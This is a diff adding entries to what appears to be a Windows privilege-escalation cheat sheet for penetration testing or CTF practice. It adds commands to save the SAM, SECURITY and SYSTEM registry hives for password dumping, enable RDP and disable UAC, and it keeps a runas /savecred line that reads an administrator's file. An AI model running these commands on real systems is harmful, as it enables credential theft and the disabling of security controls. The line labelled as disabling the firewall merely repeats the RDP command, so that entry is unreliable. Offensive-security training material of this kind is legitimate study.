@@ -680,6 +680,13 @@ Find Running Services:
 ```
 $ sc query state=all
 ```
+
+Dump passwords:
+```powershell
+$ reg.exe save hklm\sam c:\sam_backup
+$ reg.exe save hklm\security c:\security_backup
+$ reg.exe save hklm\system c:\system
+```
     
 Cached Credentials:
 ```powershell
@@ -691,6 +698,22 @@ $ cmdkey /list
 
 # RUNAS: https://ss64.com/nt/runas.html
 $ runas /savecred /User:ACCESS\Administrator "cmd.exe /C type C:\Users\Administrator\Desktop\root.txt>C:\Users\noob\out.txt"
+```
+
+Tweak security:
+```powershell
+# Allow RDP
+$ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+# Disable UAC
+$ reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system
+$ reg setval -v EnableLUA -d 0 -t REG_DWORD -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system
+
+# Refresh policies
+gpupdate /force
+
+# Disable the Firewall
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ```
 
 Nestat:
